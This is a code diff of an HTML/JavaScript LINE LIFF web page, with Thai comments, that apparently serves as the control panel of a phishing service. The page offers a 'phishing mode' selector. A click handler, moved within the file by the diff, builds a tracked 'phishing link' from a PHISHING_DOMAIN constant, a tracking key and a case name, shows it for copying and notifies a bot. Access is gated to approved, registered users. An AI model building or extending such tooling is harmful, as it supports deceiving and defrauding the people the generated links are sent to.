@@ -179,7 +179,7 @@
 
         .user-info .user-name {
             font-weight: 600;
-            color: var (--text-color);
+            color: var(--text-color);
             font-size: 18px;
             margin-bottom: 5px;
         }
@@ -635,7 +635,6 @@
                 padding: 12px 15px;
             }
         }
-
         .mode-btn.active {
             background: linear-gradient(90deg, #3876BF, #5A96E3) !important;
             color: #fff !important;
@@ -680,7 +679,24 @@
         </div>
         
         <div class="content">
-            <!-- ส่วนเลือกโหมดฟิชชิ่ง -->
+            <!-- ส่วนแสดงข้อมูลผู้ใช้ -->
+            <div class="user-info" id="userInfoSection" style="display: none;">
+                <div class="profile">
+                    <img id="profileImage" src="" alt="Profile" class="profile-img">
+                    <div>
+                        <div class="user-name" id="userName">User Name</div>
+                        <div class="user-status">
+                            <span><i class="fas fa-circle-info"></i> สถานะ:</span> <span id="userStatus">ตรวจสอบสิทธิ์...</span>
+                            <span id="statusBadge" class="badge">รอตรวจสอบ</span>
+                        </div>
+                        <!-- เพิ่มส่วนแสดงวันหมดอายุ -->
+                        <div class="user-status" id="expirationDate" style="display: none; margin-top: 5px; font-size: 13px; color: #666;">
+                            <i class="fas fa-clock"></i> ไม่มีข้อมูลวันหมดอายุ
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- โหมดเลือกฟิชชิ่ง -->
             <div class="form-group" id="modeSelectorGroup" style="margin-bottom: 32px;">
                 <label>เลือกโหมดฟิชชิ่ง</label>
                 <div id="modeSelector" style="display: flex; gap: 18px;">
@@ -712,30 +728,6 @@
             </div>
             <!-- ฟอร์มโหมดรูปภาพ (เดิม) -->
             <div id="mainForm">
-                <!-- ส่วนแสดงข้อมูลผู้ใช้ -->
-                <div class="user-info" id="userInfoSection" style="display: none;">
-                    <div class="profile">
-                        <img id="profileImage" src="" alt="Profile" class="profile-img">
-                        <div>
-                            <div class="user-name" id="userName">User Name</div>
-                            <div class="user-status">
-                                <span><i class="fas fa-circle-info"></i> สถานะ:</span> <span id="userStatus">ตรวจสอบสิทธิ์...</span>
-                                <span id="statusBadge" class="badge">รอตรวจสอบ</span>
-                            </div>
-                            <!-- เพิ่มส่วนแสดงวันหมดอายุ -->
-                            <div class="user-status" id="expirationDate" style="display: none; margin-top: 5px; font-size: 13px; color: #666;">
-                                <i class="fas fa-clock"></i> ไม่มีข้อมูลวันหมดอายุ
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ข้อความแนะนำหรือแจ้งเตือน -->
-                <div id="permissionMessage" class="message-box" style="display: none;">
-                    <p>กรุณารอการอนุมัติจากผู้ดูแลระบบก่อนใช้งาน หากคุณยังไม่ได้ลงทะเบียน สามารถพิมพ์คำสั่ง <strong>#regis</strong> ในแชทส่วนตัวกับบอท</p>
-                </div>
-                
-                <!-- ฟอร์มหลัก -->
                 <div class="form-group">
                     <label for="caseName">ชื่อเคส</label>
                     <input type="text" id="caseName" placeholder="ระบุชื่อหรือรายละเอียดเคส" required>
@@ -1162,51 +1154,6 @@
                     return;
                 }
                 document.getElementById('imageUpload').click();
-            });
-
-            // === เพิ่ม Event สำหรับโหมดลิงก์ ===
-            document.getElementById('genLinkBtn').addEventListener('click', async function() {
-                if (!isLiffInitialized) {
-                    showStatus('กรุณารอให้ LIFF เริ่มต้นก่อน', false);
-                    return;
-                }
-                if (!userHasPermission) {
-                    showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
-                    return;
-                }
-                const caseName = document.getElementById('caseNameLink').value.trim();
-                if (!caseName) {
-                    showStatus('กรุณาระบุชื่อเคส', false);
-                    return;
-                }
-                // 1. สร้าง Tracking Key
-                const trackKey = generateTrackingKey();
-                // 2. สร้างลิงก์ฟิชชิ่ง
-                const phishingLink = `${PHISHING_DOMAIN}?daily=${trackKey}&case=${encodeURIComponent(caseName)}&source=link`;
-                // 3. แสดงลิงก์ใน UI
-                document.getElementById('generatedLink').value = phishingLink;
-                document.getElementById('linkResult').style.display = 'block';
-
-                // 4. โพสต์ข้อความ #genlink ลงแชทบอทส่วนตัว
-                try {
-                    await postGenlinkToBot(caseName);
-                } catch (e) {
-                    showStatus('เกิดข้อผิดพลาดในการแจ้งบอท: ' + e.message, false);
-                }
-
-                // 5. ปิด LIFF หลังใช้งาน (delay เล็กน้อยให้ผู้ใช้เห็นลิงก์)
-                setTimeout(() => {
-                    if (liff && liff.closeWindow) liff.closeWindow();
-                }, 1700);
-            });
-
-            // ปุ่มคัดลอกลิงก์
-            document.getElementById('copyLinkBtn').addEventListener('click', function() {
-                const linkInput = document.getElementById('generatedLink');
-                linkInput.select();
-                linkInput.setSelectionRange(0, 99999);
-                document.execCommand('copy');
-                showStatus('คัดลอกลิงก์แล้ว', true);
             });
         }
         
@@ -1708,6 +1655,54 @@
             mainForm.style.display = '';
             linkForm.style.display = 'none';
         }
+
+        // === เพิ่ม Event สำหรับโหมดลิงก์ ===
+        document.addEventListener('DOMContentLoaded', function() {
+            // ...existing code...
+            document.getElementById('genLinkBtn').addEventListener('click', async function() {
+                if (!isLiffInitialized) {
+                    showStatus('กรุณารอให้ LIFF เริ่มต้นก่อน', false);
+                    return;
+                }
+                if (!userHasPermission) {
+                    showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
+                    return;
+                }
+                const caseName = document.getElementById('caseNameLink').value.trim();
+                if (!caseName) {
+                    showStatus('กรุณาระบุชื่อเคส', false);
+                    return;
+                }
+                // 1. สร้าง Tracking Key
+                const trackKey = generateTrackingKey();
+                // 2. สร้างลิงก์ฟิชชิ่ง
+                const phishingLink = `${PHISHING_DOMAIN}?daily=${trackKey}&case=${encodeURIComponent(caseName)}&source=link`;
+                // 3. แสดงลิงก์ใน UI
+                document.getElementById('generatedLink').value = phishingLink;
+                document.getElementById('linkResult').style.display = 'block';
+
+                // 4. โพสต์ข้อความ #genlink ลงแชทบอทส่วนตัว
+                try {
+                    await postGenlinkToBot(caseName);
+                } catch (e) {
+                    showStatus('เกิดข้อผิดพลาดในการแจ้งบอท: ' + e.message, false);
+                }
+
+                // 5. ปิด LIFF หลังใช้งาน (delay เล็กน้อยให้ผู้ใช้เห็นลิงก์)
+                setTimeout(() => {
+                    if (liff && liff.closeWindow) liff.closeWindow();
+                }, 1700);
+            });
+
+            // ปุ่มคัดลอกลิงก์
+            document.getElementById('copyLinkBtn').addEventListener('click', function() {
+                const linkInput = document.getElementById('generatedLink');
+                linkInput.select();
+                linkInput.setSelectionRange(0, 99999);
+                document.execCommand('copy');
+                showStatus('คัดลอกลิงก์แล้ว', true);
+            });
+        });
 
         // === ฟังก์ชันโพสต์ #genlink ไปแชทบอทส่วนตัว ===
         async function postGenlinkToBot(caseName) {
